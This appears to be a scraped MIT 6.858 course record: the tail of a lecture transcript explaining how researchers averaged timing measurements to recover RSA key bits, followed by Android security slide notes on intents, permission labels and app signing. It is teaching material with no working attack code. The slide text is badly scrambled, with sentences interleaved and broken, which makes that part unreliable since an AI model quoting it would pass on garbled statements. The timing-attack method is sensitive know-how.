            </slice>
            <slice>
              <time_slice>1:18:18</time_slice>
              <text_slice>In the paper, they
said they send it</text_slice>
            </slice>
            <slice>
              <time_slice>1:18:20</time_slice>
              <text_slice>like 7 times or something.</text_slice>
            </slice>
            <slice>
              <time_slice>1:18:22</time_slice>
              <text_slice>So what kind of
noise do you think</text_slice>
            </slice>
            <slice>
              <time_slice>1:18:24</time_slice>
              <text_slice>this helps them with
[? if they ?] just resend</text_slice>
            </slice>
            <slice>
              <time_slice>1:18:26</time_slice>
              <text_slice>the same guess over and over?</text_slice>
            </slice>
            <slice>
              <time_slice>1:18:29</time_slice>
              <text_slice>Yeah.</text_slice>
            </slice>
            <slice>
              <time_slice>1:18:30</time_slice>
              <text_slice>AUDIENCE: What's up
with the [INAUDIBLE]?</text_slice>
            </slice>
            <slice>
              <time_slice>1:18:33</time_slice>
              <text_slice>PROFESSOR: Yeah, so
if the network keeps</text_slice>
            </slice>
            <slice>
              <time_slice>1:18:34</time_slice>
              <text_slice>adding different
things, you just</text_slice>
            </slice>
            <slice>
              <time_slice>1:18:36</time_slice>
              <text_slice>try the same thing many times.</text_slice>
            </slice>
            <slice>
              <time_slice>1:18:37</time_slice>
              <text_slice>The thing in the
server should be</text_slice>
            </slice>
            <slice>
              <time_slice>1:18:39</time_slice>
              <text_slice>taking exactly the same
amount of time every time</text_slice>
            </slice>
            <slice>
              <time_slice>1:18:41</time_slice>
              <text_slice>and just average out
the network noise.</text_slice>
            </slice>
            <slice>
              <time_slice>1:18:42</time_slice>
              <text_slice>In the paper, they say they take
the median value-- I actually</text_slice>
            </slice>
            <slice>
              <time_slice>1:18:45</time_slice>
              <text_slice>don't understand why
they take the median,</text_slice>
            </slice>
            <slice>
              <time_slice>1:18:47</time_slice>
              <text_slice>I think they should be taking
the min of the real thing</text_slice>
            </slice>
            <slice>
              <time_slice>1:18:48</time_slice>
              <text_slice>that's going on--
but anyway, this</text_slice>
            </slice>
            <slice>
              <time_slice>1:18:50</time_slice>
              <text_slice>was the average of the network.</text_slice>
            </slice>
            <slice>
              <time_slice>1:18:52</time_slice>
              <text_slice>But then they do this
other weird thing,</text_slice>
            </slice>
            <slice>
              <time_slice>1:18:54</time_slice>
              <text_slice>which is that when
they're sending a guess,</text_slice>
            </slice>
            <slice>
              <time_slice>1:18:57</time_slice>
              <text_slice>they don't just send
the same guess 7 times,</text_slice>
            </slice>
            <slice>
              <time_slice>1:19:00</time_slice>
              <text_slice>they actually send a
neighborhood of guesses.</text_slice>
            </slice>
            <slice>
              <time_slice>1:19:02</time_slice>
              <text_slice>And each value in
the neighborhood</text_slice>
            </slice>
            <slice>
              <time_slice>1:19:04</time_slice>
              <text_slice>gets sent 7 times itself.</text_slice>
            </slice>
            <slice>
              <time_slice>1:19:06</time_slice>
              <text_slice>So they actually send g 7 times.</text_slice>
            </slice>
            <slice>
              <time_slice>1:19:09</time_slice>
              <text_slice>Then they send g
plus 1 also 7 times.</text_slice>
            </slice>
            <slice>
              <time_slice>1:19:13</time_slice>
              <text_slice>Then they send g plus 2 also
7 times, et cetera, up to g</text_slice>
            </slice>
            <slice>
              <time_slice>1:19:17</time_slice>
              <text_slice>plus 400 in the paper.</text_slice>
            </slice>
            <slice>
              <time_slice>1:19:20</time_slice>
              <text_slice>Why do they do this
kind of averaging</text_slice>
            </slice>
            <slice>
              <time_slice>1:19:23</time_slice>
              <text_slice>as well over different g value
instead of just sending g</text_slice>
            </slice>
            <slice>
              <time_slice>1:19:29</time_slice>
              <text_slice>7 times 400 times.</text_slice>
            </slice>
            <slice>
              <time_slice>1:19:32</time_slice>
              <text_slice>Because it seems
more straightforward.</text_slice>
            </slice>
            <slice>
              <time_slice>1:19:33</time_slice>
              <text_slice>Yeah?</text_slice>
            </slice>
            <slice>
              <time_slice>1:19:34</time_slice>
              <text_slice>AUDIENCE: [INAUDIBLE]</text_slice>
            </slice>
            <slice>
              <time_slice>1:19:38</time_slice>
              <text_slice>PROFESSOR: Yeah, that's
actually what's going on.</text_slice>
            </slice>
            <slice>
              <time_slice>1:19:40</time_slice>
              <text_slice>We're actually trying to measure
exactly how long this piece</text_slice>
            </slice>
            <slice>
              <time_slice>1:19:44</time_slice>
              <text_slice>of computation will take.</text_slice>
            </slice>
            <slice>
              <time_slice>1:19:45</time_slice>
              <text_slice>But then there's
lots of other stuff.</text_slice>
            </slice>
            <slice>
              <time_slice>1:19:46</time_slice>
              <text_slice>For example, this other
pipeline that's at the bottom</text_slice>
            </slice>
            <slice>
              <time_slice>1:19:48</time_slice>
              <text_slice>is doing all the stuff mod p.</text_slice>
            </slice>
            <slice>
              <time_slice>1:19:50</time_slice>
              <text_slice>I mean it's also going to
take different amount of time</text_slice>
            </slice>
            <slice>
              <time_slice>1:19:52</time_slice>
              <text_slice>depending on what
exactly the input is.</text_slice>
            </slice>
            <slice>
              <time_slice>1:19:54</time_slice>
              <text_slice>So the cool thing is
that if you perturb</text_slice>
            </slice>
            <slice>
              <time_slice>1:19:57</time_slice>
              <text_slice>the value of all your
guess g by adding 1, 2, 3,</text_slice>
            </slice>
            <slice>
              <time_slice>1:20:01</time_slice>
              <text_slice>whatever, it's just
[INAUDIBLE] the little bits.</text_slice>
            </slice>
            <slice>
              <time_slice>1:20:03</time_slice>
              <text_slice>So the timing attack we
just looked at just now,</text_slice>
            </slice>
            <slice>
              <time_slice>1:20:05</time_slice>
              <text_slice>isn't going to change
because that depended</text_slice>
            </slice>
            <slice>
              <time_slice>1:20:07</time_slice>
              <text_slice>on this middle bit flipping.</text_slice>
            </slice>
            <slice>
              <time_slice>1:20:10</time_slice>
              <text_slice>But everything that's
happening on the bottom side</text_slice>
            </slice>
            <slice>
              <time_slice>1:20:13</time_slice>
              <text_slice>of the pipeline mod p
is going to be totally</text_slice>
            </slice>
            <slice>
              <time_slice>1:20:15</time_slice>
              <text_slice>randomized by this
because when they</text_slice>
            </slice>
            <slice>
              <time_slice>1:20:17</time_slice>
              <text_slice>do it mod p then
adding an extra bit</text_slice>
            </slice>
            <slice>
              <time_slice>1:20:19</time_slice>
              <text_slice>could shift things
around quite a bit mod p.</text_slice>
            </slice>
            <slice>
              <time_slice>1:20:22</time_slice>
              <text_slice>Then you're going to,
it will average out</text_slice>
            </slice>
            <slice>
              <time_slice>1:20:25</time_slice>
              <text_slice>other kinds of
computational noise</text_slice>
            </slice>
            <slice>
              <time_slice>1:20:28</time_slice>
              <text_slice>that's deterministic
for a particular value</text_slice>
            </slice>
            <slice>
              <time_slice>1:20:30</time_slice>
              <text_slice>but it's not related to this
part of the computation we're</text_slice>
            </slice>
            <slice>
              <time_slice>1:20:33</time_slice>
              <text_slice>trying to go after.</text_slice>
            </slice>
            <slice>
              <time_slice>1:20:34</time_slice>
              <text_slice>Make sense?</text_slice>
            </slice>
            <slice>
              <time_slice>1:20:35</time_slice>
              <text_slice>AUDIENCE: How do they
do that when they</text_slice>
            </slice>
            <slice>
              <time_slice>1:20:37</time_slice>
              <text_slice>try to guess the lower bits?</text_slice>
            </slice>
            <slice>
              <time_slice>1:20:38</time_slice>
              <text_slice>PROFESSOR: So actually they use
some other mathematical trick</text_slice>
            </slice>
            <slice>
              <time_slice>1:20:41</time_slice>
              <text_slice>to only actually bother guessing
the top half of the bits of q.</text_slice>
            </slice>
            <slice>
              <time_slice>1:20:44</time_slice>
              <text_slice>It turns out if you know the
top half of the bits of q</text_slice>
            </slice>
            <slice>
              <time_slice>1:20:47</time_slice>
              <text_slice>there's some math you can
rely on to factor the numbers,</text_slice>
            </slice>
            <slice>
              <time_slice>1:20:50</time_slice>
              <text_slice>and then you're in good shape.</text_slice>
            </slice>
            <slice>
              <time_slice>1:20:51</time_slice>
              <text_slice>So you can always
[INAUDIBLE] little bit.</text_slice>
            </slice>
            <slice>
              <time_slice>1:20:53</time_slice>
              <text_slice>Basically not worry about it.</text_slice>
            </slice>
            <slice>
              <time_slice>1:20:55</time_slice>
              <text_slice>Make sense?</text_slice>
            </slice>
            <slice>
              <time_slice>1:20:56</time_slice>
              <text_slice>Yeah, question.</text_slice>
            </slice>
            <slice>
              <time_slice>1:20:57</time_slice>
              <text_slice>AUDIENCE: [INAUDIBLE]</text_slice>
            </slice>
            <slice>
              <time_slice>1:21:01</time_slice>
              <text_slice>PROFESSOR: Well, you're going to
construct this value c0-- well</text_slice>
            </slice>
            <slice>
              <time_slice>1:21:05</time_slice>
              <text_slice>you want the c0 prime-- you're
going to construct a value</text_slice>
            </slice>
            <slice>
              <time_slice>1:21:08</time_slice>
              <text_slice>c by basically taking your c0
prime and multiplying it times</text_slice>
            </slice>
            <slice>
              <time_slice>1:21:13</time_slice>
              <text_slice>R inverse mod n.</text_slice>
            </slice>
            <slice>
              <time_slice>1:21:17</time_slice>
              <text_slice>And then when the
server takes this value,</text_slice>
            </slice>
            <slice>
              <time_slice>1:21:20</time_slice>
              <text_slice>it's going to push
it through here.</text_slice>
            </slice>
            <slice>
              <time_slice>1:21:22</time_slice>
              <text_slice>So it's going to compute c0.</text_slice>
            </slice>
            <slice>
              <time_slice>1:21:23</time_slice>
              <text_slice>It's going to be c mod
q, so that value is going</text_slice>
            </slice>
            <slice>
              <time_slice>1:21:26</time_slice>
              <text_slice>to be c0 prime R inverse mod q.</text_slice>
            </slice>
            <slice>
              <time_slice>1:21:29</time_slice>
              <text_slice>Then you multiply it by R, so
you get rid of the R inverse.</text_slice>
            </slice>
            <slice>
              <time_slice>1:21:32</time_slice>
              <text_slice>And then you end up with a
guess exactly in this position.</text_slice>
            </slice>
            <slice>
              <time_slice>1:21:35</time_slice>
              <text_slice>So the cool thing is
basically all manipulations</text_slice>
            </slice>
            <slice>
              <time_slice>1:21:37</time_slice>
              <text_slice>leading up to here are
just multiplying by this R.</text_slice>
            </slice>
            <slice>
              <time_slice>1:21:40</time_slice>
              <text_slice>And you know what R is going be,
it's going to be 2 to the 512.</text_slice>
            </slice>
            <slice>
              <time_slice>1:21:43</time_slice>
              <text_slice>I'm going to be really
straightforward.</text_slice>
            </slice>
            <slice>
              <time_slice>1:21:46</time_slice>
              <text_slice>Make sense?</text_slice>
            </slice>
            <slice>
              <time_slice>1:21:47</time_slice>
              <text_slice>Another question?</text_slice>
            </slice>
            <slice>
              <time_slice>1:21:48</time_slice>
              <text_slice>AUDIENCE: Could we just
cancel out timing [INAUDIBLE]?</text_slice>
            </slice>
            <slice>
              <time_slice>1:21:56</time_slice>
              <text_slice>PROFESSOR: Well, if you do
p, you'd be in business.</text_slice>
            </slice>
            <slice>
              <time_slice>1:21:59</time_slice>
              <text_slice>Yeah, so that's the thing.</text_slice>
            </slice>
            <slice>
              <time_slice>1:22:01</time_slice>
              <text_slice>Yeah, you don't know
what p is, but you just</text_slice>
            </slice>
            <slice>
              <time_slice>1:22:03</time_slice>
              <text_slice>want to randomize it out.</text_slice>
            </slice>
            <slice>
              <time_slice>1:22:06</time_slice>
              <text_slice>Any questions?</text_slice>
            </slice>
            <slice>
              <time_slice>1:22:07</time_slice>
              <text_slice>All right. [INAUDIBLE] but
thanks for sticking around.</text_slice>
            </slice>
            <slice>
              <time_slice>1:22:10</time_slice>
              <text_slice>So we'll start talking about
other kinds of problems</text_slice>
            </slice>
            <slice>
              <time_slice>1:22:13</time_slice>
              <text_slice>next week.</text_slice>
            </slice>
          </transcript>
        </video>
      </videos>
    </lecture>
    <lecture>
      <lecture_title>Mobile Phone Security (PDF)</lecture_title>
      <lecture_pdf_url>https://ocw.mit.edu/courses/6-858-computer-systems-security-fall-2014/resources/mit6_858f14_lec20/</lecture_pdf_url>
      <lectureno>20</lectureno>
      <slides>
        <slide>
          <slideno>0</slideno>
          <text>6.858	&#13; Lecture	&#13; 20 	&#13; 
Why	&#13; this	&#13; paper? 	&#13; Android	&#13; Security	&#13; 
 
 Real	&#13; system,	&#13; widely	&#13; used.	&#13; Careful	&#13; security	&#13; design	&#13; (more	&#13; so	&#13; than	&#13; for	&#13; web	&#13; or	&#13; desktop	&#13; applications).	&#13; 
o 
 Principals	&#13; =	&#13; Applications	&#13; (not	&#13; users)	&#13; 
 But	&#13; alsSome	&#13; problems	&#13; inevitable,	&#13; and	&#13; instructive	&#13; to	&#13; see	&#13; where	&#13; problems	&#13; come	&#13; up.	&#13; o Policy	&#13; separate	&#13; from	&#13; code	&#13; (manifests)	&#13; 
	&#13; o	&#13; interesting	&#13; to	&#13; see	&#13; how	&#13; to	&#13; design	&#13; a	&#13; reasonable	&#13; security	&#13; plan. 	&#13; 
Threat	&#13; model	&#13; 
 
 Goal:	&#13; Anyone	&#13; can	&#13; write	&#13; an	&#13; app	&#13; that	&#13; anyone	&#13; can	&#13; install	&#13; Threa
	&#13; o 
o ts:
Apps	&#13; may	&#13; have	&#13; bugs	&#13; 	&#13; 
Apps	&#13; may	&#13; be	&#13; malicious	&#13; 
CVE
 
ht	&#13; da
tp://wtabase
w	&#13; 
 19997/Googlw.cvedetails.com/vulnerability-
e-Android.html	&#13; list/vendor_id-1224/product_id-
Some	&#13; bugs	&#13; but	&#13; not	&#13; overwhelming---
o 
 bufis	&#13; the	&#13; security	&#13; plan	&#13; working? 	&#13; 
	&#13; Of	&#13; course,	&#13; f
Android	&#13; er	&#13; overrun	&#13; (
runs	&#13; sti
onll	&#13; h
	&#13; Linappe
ux,	&#13; ns
an	&#13; ....)
d	&#13; this	&#13; 	&#13; 
includes	&#13; Linux	&#13; kernel	&#13; proble ms	&#13; 
Ove
 
 First	&#13; understand	&#13; how	&#13; Android	&#13; applications	&#13; look	&#13; like	&#13; and	&#13; work.	&#13; rall	&#13; plan:	&#13; 
	&#13; Then	&#13; discuss	&#13; security	&#13; mechanisms	&#13; and	&#13; policies.	&#13; 
What	&#13; does	&#13; an	&#13; Android	&#13; application	&#13; look	&#13; like?	&#13; 
 Four	&#13; types	&#13; of	&#13; components:
o 
o 	&#13; 
o Service:	&#13; background	&#13; processing,	&#13; can	&#13; be	&#13; invoked	&#13; by	&#13; other	&#13; components.	&#13; Activity:	&#13; UI	&#13; component	&#13; of	&#13; app,	&#13; typically	&#13; one	&#13; activity	&#13; per	&#13; "screen". 	&#13; 
o Con
components.	&#13; tent	&#13; provider:	&#13; a	&#13; SQL	&#13; database	&#13; that	&#13; can	&#13; be	&#13; accessed	&#13; by	&#13; other	&#13; 
 Broadcast	&#13; receiver:	&#13; gets	&#13; broadcast	&#13; announcements	&#13; from	&#13; other	&#13; 
 Each	&#13; application	&#13; alscomponents.	&#13; 
 o	&#13; has	&#13; priva te	&#13; file	&#13; storage. 	&#13; 

	&#13;  Application	&#13; typically	&#13; written	&#13; in	&#13; Java.	&#13; 
 Application	&#13; also	&#13; has	&#13; a	&#13; manifest	&#13; declaring	&#13; its	&#13; permissions	&#13; (later).	&#13; Runs	&#13; on	&#13; a	&#13; Linux	&#13; kernel	&#13; +	&#13; Android	&#13; "platform"	&#13; (will	&#13; get	&#13; to	&#13; it	&#13; shortly).	&#13; 
Entire	&#13; application	&#13; is	&#13; signed	&#13; by	&#13; the	&#13; developer. 	&#13; 
Activity:	&#13; can	&#13; d
 
 Only	&#13; one	&#13; activity	&#13; is	&#13; running	&#13; at	&#13; a	&#13; time.	&#13; raw	&#13; on	&#13; the	&#13; screen,	&#13; get	&#13; user	&#13; input,	&#13; etc. 	&#13; 
Helps	&#13; users	&#13; reason
	&#13; about	&#13; security	&#13; of	&#13; inputs.	&#13; 
1</text>
        </slide>
        <slide>
          <slideno>6</slideno>
          <text>bootup).	&#13; 
	&#13;  Only	&#13; system	&#13; processes	&#13; can	&#13; send	&#13; those	&#13; broadcast	&#13; intents.	&#13; 
C
 an	&#13; a	&#13; sender	&#13; rely	&#13; on	&#13; names	&#13; to	&#13; route	&#13; intents	&#13; to	&#13; a	&#13; specific	&#13; component?
More	&#13; broadly,	&#13; how	&#13; does	&#13; android	&#13; authenticate	&#13; names?	&#13; 	&#13; (App	&#13; names,	&#13; perm	&#13; 	&#13; 
 
 names.)
No	&#13; genera	&#13; 
 System	&#13; names	&#13; (apps,	&#13; permissions,	&#13; etc)	&#13; win	&#13; in	&#13; this	&#13; modl	&#13; plan,	&#13; just	&#13; first -come-first-served. 	&#13; 
 Other	&#13; apps	&#13; could	&#13; be	&#13; preempted	&#13; by	&#13; a	&#13; malicious	&#13; app	&#13; that	&#13; comes	&#13; first.el.	&#13; 
Could	&#13; send	&#13; sensitive	&#13; data	&#13; to	&#13; malicious	&#13; app,	&#13; by	&#13; using	&#13; app's	&#13; name.	&#13; 
	&#13;  
 Could	&#13; trust	&#13; intent	&#13; from	&#13; malicious	&#13; app,	&#13; by	&#13; looking	&#13; at	&#13; its	&#13; sender	&#13; name.	&#13; 
Could	&#13; set	&#13; lax	&#13; permissions	&#13; by	&#13; using	&#13; a	&#13; malicious	&#13; app's	&#13; perm	&#13; by	&#13; name.	&#13; 	&#13; 
What	&#13; happens	&#13; if	&#13; two	&#13; apps	&#13; define	&#13; the	&#13; same	&#13; permission	&#13; name?
 
 First	&#13; one	&#13; win	&#13; 
 
 Any	&#13; app	&#13; (including	&#13; malicious	&#13; app)	&#13; can	&#13; get	&#13; this	&#13; permission	&#13; now.Malicious	&#13; app	&#13; could	&#13; register	&#13; some	&#13; important	&#13; perm	&#13; name	&#13; as	&#13; "normal".s.	&#13; 
	&#13; 	&#13; 
Other	&#13; apps	&#13; that	&#13; rely	&#13; on	&#13; this	&#13; perm	&#13; 
o Even	&#13; if	&#13; victim	&#13; app	&#13; defines	&#13; its	&#13; own	&#13; perms	&#13; and	&#13; is	&#13; the	&#13; only	&#13; one	&#13; that	&#13; uses	&#13; it.will	&#13; be	&#13; vulnerable	&#13; to	&#13; malicious	&#13; app.	&#13; 
 (E.g.,	&#13; signature	&#13; perms.)	&#13; 	&#13; 
Possibly	&#13; better:	&#13; reject	&#13; installing	&#13; an	&#13; app	&#13; if	&#13; perm	&#13; is	&#13; already	&#13; defined.
o 
o Allows	&#13; an	&#13; app	&#13; to	&#13; assume	&#13; its	&#13; own	&#13; perms	&#13; are	&#13; correctly	&#13; define	&#13; 
d.
names.Still	&#13; does	&#13; not	&#13; allow	&#13; an	&#13; app	&#13; to	&#13; assume	&#13; anything	&#13; about	&#13; other	&#13; app/perm	&#13; 	&#13; 
	&#13; 	&#13; 
If	&#13; app	&#13; names	&#13; are	&#13; not	&#13; authenticated,	&#13; why	&#13; do	&#13; applications	&#13; need	&#13; signatures?
 
 Representing	&#13; a	&#13; developer. 	&#13; 	&#13; 
 No	&#13; real	&#13; requirement	&#13; for	&#13; a	&#13; C
Helps	&#13; Android	&#13; answer	&#13; three	&#13; questions:
o A.	&#13; 
	&#13; 
o one?Did	&#13; this	&#13; new	&#13; version	&#13; of	&#13; an	&#13; app	&#13; come	&#13; from	&#13; the	&#13; same	&#13; developer	&#13; as	&#13; the	&#13; old	&#13; 
	&#13; oDid	&#13; these	&#13; two	&#13; apps	&#13; come	&#13; from	&#13; the	&#13; same	&#13; developer?	&#13; (if	&#13; so,	&#13; can	&#13; upgrade.) 	&#13; 
 same	&#13; UID.)	&#13; 	&#13; (if	&#13; so,	&#13; can	&#13; request	&#13; 
Did	&#13; the	&#13; app	&#13; come	&#13; from	&#13; same	&#13; developer	&#13; as	&#13; the	&#13; one	&#13; that	&#13; defined	&#13; a	&#13; 
permission?	&#13; (if	&#13; so,	&#13; can	&#13; get	&#13; access	&#13; to	&#13; signature -level	&#13; perms.)	&#13; 
H
 ow	&#13; to	&#13; give	&#13; another	&#13; app	&#13; temporary	&#13; permissions?
URI	&#13; del
o egation.	&#13; 	&#13; 
o Ca
System	&#13; keeps	&#13; track	&#13; of	&#13; delegated	&#13; access	&#13; by	&#13; literal	&#13; string	&#13; URI.p
a
Must	&#13; remember	&#13; to	&#13; revoke	&#13; delegated	&#13; access! bility-style	&#13; delegation	&#13; of	&#13; URI	&#13; read/write	&#13; access. 	&#13; 
o E.g.,	&#13; content://gmail/attachment/7	&#13; 	&#13; 
 
 E.g.,	&#13; URI	&#13; may	&#13; mean	&#13; another	&#13; record	&#13; at	&#13; a	&#13; later	&#13; time..	&#13; 
	&#13; Reference	&#13; monitor	&#13; special-cases	&#13; some	&#13; intent	&#13; actions	&#13; (e.g.,	&#13; system	&#13; 
ref:	&#13; grantUriPerm
ission(),	&#13; revokeUriPermission()	&#13; 
7</text>
        </slide>
        <slide>
          <slideno>9</slideno>
          <text>MIT OpenCourseWare
http://ocw.mit.edu 
6.858  Computer Systems Security 
Fall 2014 
For information about citing these materials or our Terms of Use, visit: http://ocw.mit.edu/terms.</text>
        </slide>
        <slide>
          <slideno>3</slideno>
          <text>o FAT	&#13; file	&#13; system	&#13; has	&#13; no	&#13; notion	&#13; of	&#13; file	&#13; ownership,	&#13; permissions,	&#13; etc.
o (1015).Kernel	&#13; tr
	&#13; eats	&#13; all	&#13; SD	&#13; card	&#13; files	&#13; as	&#13; owned	&#13; by	&#13; special	&#13; group	&#13; sdcard_rw	&#13; 	&#13; 
o 
 Apps	&#13; that	&#13; should	&#13; have	&#13; access	&#13; to	&#13; SD	&#13; card	&#13; have	&#13; this	&#13; GID	&#13; i
No	&#13; finer-grained	&#13; isolation	&#13; within	&#13; the	&#13; entire	&#13; SD	&#13; card.	&#13; n	&#13; their	&#13; group	&#13; list.	&#13; 
Devices.
o 
o Device	&#13; files	&#13; (/dev/camera,	&#13; /dev/compass,	&#13; etc)	&#13; owned	&#13; by	&#13; special	&#13; groups.	&#13; 
 Intents
o Apps	&#13; run	&#13; with	&#13; appropriate	&#13; groups	&#13; in	&#13; their	&#13; group	&#13; list.
.	&#13; 	&#13; 	&#13; 
o 
o All	&#13; intents	&#13; are	&#13; routed	&#13; via	&#13; a	&#13; single	&#13; tru
Runs	&#13; in	&#13; the	&#13; system_server	&#13; process.	&#13; sted	&#13; "reference	&#13; monitor".	&#13; 
o Reference	&#13; monitor	&#13; performs	&#13; intent	&#13; resolution	&#13; (where	&#13; to	&#13; send	&#13; intent?),implicit	&#13; intents.	&#13; 	&#13; [ref:	&#13; ActivityStack.startActivityMayWait]	&#13; 	&#13; for	&#13; 
o Reference	&#13; monitor	&#13; checks	&#13; permissions,	&#13; based	&#13; on	&#13; intent	&#13; and	&#13; wh
[ref:	&#13; ActivityStack.startActivityLocked]	&#13; o	&#13; sent	&#13; it.	&#13; 
 Why
o	&#13; no
 Routes	&#13; intent	&#13; to	&#13; the	&#13; appropr
oEfficiency:	&#13; want	&#13; direct	&#13; access	&#13; to	&#13; camera,	&#13; network,	&#13; SD	&#13; card	&#13; fit	&#13; just	&#13; use	&#13; intents	&#13; for	&#13; eiate	&#13; application	&#13; pr
 verything,	&#13; instead	&#13; of	&#13; specocess,	&#13; or
ial	&#13; groups	&#13; star
?	&#13; ts	&#13; a	&#13; new	&#13; one. 	&#13; 
Sending	&#13; everything	&#13; via	&#13; intents	&#13; could	&#13; impose	&#13; significant	&#13; overhead.les.	&#13; 
	&#13; 	&#13; 
H
 ow	&#13; does	&#13; the	&#13; reference	&#13; monitor	&#13; decide	&#13; whether	&#13; to	&#13; allow	&#13; an	&#13; intent?
"Labels"	&#13; assigned	&#13; to	&#13; applications	&#13; and	&#13; components.
o 	&#13; 	&#13; 
o 
o Each	&#13; label	&#13; is
Commonly	&#13; written	&#13; as	&#13; Java	&#13; a	&#13; free-form	&#13; string.
 E.g.,	&#13; com.android.phone.DIALPERM.-style	&#13; 	&#13; 
package	&#13; names,	&#13; for	&#13; uniqueness.
	&#13; 	&#13; 
Each	&#13; component	&#13; has	&#13; a	&#13; single	&#13; label	&#13; that	&#13; protects	&#13; it.
o o Any	&#13; intents	&#13; to	&#13; that	&#13; component	&#13; must	&#13; be	&#13; sent	&#13; by	&#13; app	&#13; that	&#13; has	&#13; that	&#13; label.	&#13; 
o E.g.,	&#13; phone	&#13; dialer	&#13; service	&#13; is	&#13; labeled	&#13; with	&#13; ...DIALPERM.	&#13; 	&#13; 
 An	&#13; application	&#13; has	&#13; a	&#13; list	&#13; of	&#13; labels	&#13; it	&#13; is	&#13; authorized	&#13; to	&#13; use.
Other	&#13; permissions	&#13; (network,	&#13; devices,	&#13; SD	&#13; card)	&#13; map	&#13; to	&#13; special	&#13; label	&#13; strings.o For	&#13; content	&#13; providers,	&#13; two	&#13; labels:	&#13; one	&#13; for	&#13; read,	&#13; one	&#13; f
	&#13; or	&#13; write.	&#13; 
 
o E.g.,	&#13; if	&#13; app	&#13; can	&#13; dial	&#13; the	&#13; phone,	&#13; ...DIALPERM	&#13; is	&#13; in	&#13; its	&#13; label	&#13; set.	&#13; E.g.,	&#13; android.permission.INTERNET	&#13; translates	&#13; to	&#13; app	&#13; running	&#13; w/	&#13; GID	&#13; 	&#13; 
	&#13; 3003.	&#13; 
H
 
 ow	&#13; does	&#13; an	&#13; application	&#13; get	&#13; permissions	&#13; for	&#13; a	&#13; certain	&#13; set	&#13; of	&#13; labels?
Each	&#13; app	&#13; comes	&#13; with	&#13; a	&#13; manifest	&#13; declaring	&#13; permissions	&#13; (labels)	&#13; the	&#13; app	&#13; needs.	&#13; 
 Also	&#13; declares	&#13; the	&#13; labels	&#13; that	&#13; should	&#13; protect	&#13; each	&#13; of	&#13; its	&#13; components.	&#13; 	&#13; 
 When	&#13; app	&#13; is	&#13; installed,	&#13; Android	&#13; system	&#13; asks	&#13; user	&#13; if	&#13; it's	&#13; ok	&#13; to	&#13; install	&#13; app.
Provides	&#13; list	&#13; of	&#13; permissions	&#13; that	&#13; the	&#13; application	&#13; is	&#13; requesting.	&#13; 	&#13; 
	&#13; 
At	&#13; one	&#13; point,	&#13; Android	&#13; allowed	&#13; users	&#13; to	&#13; set	&#13; fine
 
 -grained	&#13; permission	&#13; choices.	&#13; 
 Apparently	&#13; this	&#13; was	&#13; removed	&#13; in	&#13; Android	&#13; 4.4.Android	&#13; 4.3	&#13; introduced	&#13; the	&#13; "permission	&#13; manager".
	&#13; 	&#13; 
Possible	&#13; reason:	&#13; developers	&#13; want	&#13; predictab
le	&#13; access	&#13; to	&#13; things. 	&#13; 
4</text>
        </slide>
        <slide>
          <slideno>5</slideno>
          <text>Apps	&#13; can	&#13; also	&#13; perform	&#13; their	&#13; own	&#13; checks.	&#13; 	&#13; [ref:	&#13; checkCo 
 
o Hard	&#13; to	&#13; tell	&#13; what	&#13; will	&#13; happen	&#13; just	&#13; by	&#13; looking	&#13; at	&#13; current	&#13; file	&#13; perms.	&#13; 
o Breaks	&#13; the	&#13; MAC	&#13; model	&#13; a	&#13; bit:	&#13; can't	&#13; just	&#13; look	&#13; at	&#13; manifest.	&#13; allingPermission()]	&#13; 
	&#13; 
Who	&#13; can	&#13; ro Necessary	&#13; because	&#13; one	&#13; service	&#13; may	&#13; export	&#13; different	&#13; RPC
different	&#13; level	&#13; of	&#13; protection	&#13; for	&#13; each. 	&#13; 	&#13; functions,	&#13; want	&#13; 
Reference	&#13; monitor	&#13; just	&#13; checks	&#13; if	&#13; client	&#13; can	&#13; access	&#13; the	&#13; entire	&#13; service.	&#13; 
 
 Any	&#13; app	&#13; can	&#13; specify	&#13; it	&#13; wants	&#13; to	&#13; receive	&#13; intents	&#13; with	&#13; arbitrary	&#13; parameters.	&#13; egister	&#13; to	&#13; receive	&#13; intents? 	&#13; 
&lt;int	&#13; E.g.,	&#13; can	&#13; create	&#13; activity	&#13; with	&#13; an	&#13; intent	&#13; filter	&#13; (in	&#13; manifest):	&#13; 
&lt;action	&#13; android:name="ent-filter&gt;	&#13; 
&lt;category	&#13; android:name="android.intent.category.DEFAULT"/&gt;android.intent.action.VIEW"	&#13; /&gt;	&#13; 
&lt;category	&#13; android:name="android.intent.category.BROWSABLE"/&gt;	&#13; 
&lt;data	&#13; android:scheme="http"	&#13; android:host="web.mit.edu"	&#13; /&gt;	&#13; 	&#13; 
&lt;/
	&#13; 
 intent -filter&gt;	&#13; 
 Is	&#13; this	&#13; a	&#13; problem?	&#13; 	&#13; Why	&#13; or	&#13; wh
System	&#13; will	&#13; prompt	&#13; user	&#13; whenever	&#13; they	&#13; click	&#13; on	&#13; a	&#13; link	&#13; to	&#13; 
o y	&#13; not?	&#13; 
 components.	&#13; Only	&#13; "top-level"	&#13; user	&#13; clicks	&#13; translate	&#13; to	&#13; intents,	&#13; not	&#13; wehttp://web.mit.edu/.
b	&#13; page	&#13; 	&#13; 
Might	&#13; be	&#13; OK	&#13; if	&#13; user	&#13; is	&#13; prompted.	&#13; 
Noto 
 	&#13; so	&#13; greaEven	&#13; then,	&#13; what	&#13; if	&#13; your	&#13; only	&#13; map	&#13; app	&#13; is	&#13; "bad":	&#13; steals	&#13; addresse
	&#13; 
 t	&#13; for	&#13; broadcast	&#13; intents,	&#13; which	&#13; go	&#13; to	&#13; all	&#13; possible	&#13; recipients. 	&#13; s	&#13; sent	&#13; to	&#13; it? 	&#13; 
Con
otrol
 In	&#13; paper's	&#13; example,	&#13; want	&#13; FRIEND_NEAR	&#13; intents	&#13; to	&#13; not	&#13; be	&#13; disclosed	&#13; to	&#13; ling	&#13; the	&#13; distribution	&#13; of	&#13; broadcast	&#13; intents. 	&#13; 
o everyone.
Solution:	&#13; sender	&#13; 
o 	&#13; can	&#13; specify	&#13; extra	&#13; perm ission	&#13; label hen	&#13; sending	&#13; bca
Reference	&#13; monitor	&#13; only	&#13; sends	&#13; this	&#13; intent	&#13; to	&#13; recipients	&#13; that	&#13; have	&#13; that	&#13; intent.	&#13; 	&#13; w st	&#13; 
	&#13; 
 label. 	&#13; 
How
o	&#13; 
 to	&#13; 
Generally	&#13; using	&#13; a	&#13; permission	&#13; label	&#13; on	&#13; the	&#13; receiving	&#13; component.	&#13; aut
hen
 ticate	&#13; the	&#13; source	&#13; of	&#13; intents? 	&#13; 
o Don
